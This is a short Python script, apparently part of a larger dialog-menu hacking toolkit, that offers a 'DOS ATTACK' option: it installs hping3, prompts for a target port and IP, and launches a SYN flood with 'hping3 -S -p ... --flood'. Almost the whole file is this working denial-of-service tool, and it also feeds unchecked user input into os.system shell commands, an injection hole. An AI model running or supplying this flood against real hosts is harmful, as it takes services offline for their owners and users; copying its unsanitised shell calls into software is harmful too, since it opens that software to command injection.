#!/usr/bin/python/

import os,time

os.system("reset")
d='dialog'
loc='python  '
def fun1():
	f1=open('/tmp/ch1.txt','r')
	ch1=f1.read()
	f1.close()
	return ch1
def fun2():
	f2=open('/tmp/ch2.txt','r')
	ch2=f2.read()
	f2.close()
	return ch2
def exit():
	time.sleep(4)
	os.system(""+loc+" main.py")
def dos():
	os.system(""+d+"  --menu  '----****[DOS ATTACK(DENYL OF SERVICE ATTACK)]****----' 15  64  3 												1 'Install HPING3' 												2 'APPLY DOS' 		 												3 'EXIT to MAIN-MENU' 2>/tmp/ch8.txt")
	f=open('/tmp/ch8.txt','r')
	ch=f.read()
	f.close()
	if   ch=='1':
		os.system("yum install hping -y")
		exit()
	elif ch=='2':
		os.system(""+d+"  --inputbox 'Enter Port No.:' 10  30  2>/tmp/ch1.txt")
		ch1=fun1()
		os.system(""+d+"  --inputbox 'Enter IP or Address:' 10  30  2>/tmp/ch2.txt")
		ch2=fun2()
		os.system("hping3 -S  -p " +ch1+" "+ch2+" --flood")
		exit()
	elif ch=='3':
		os.system(""+loc+"main.py")
	else:
		os.system(""+d+"  --infobox  'Choose option 3 for EXIT' 5 30")
		time.sleep(2)
		os.system(""+loc+"6.py")
	
dos()
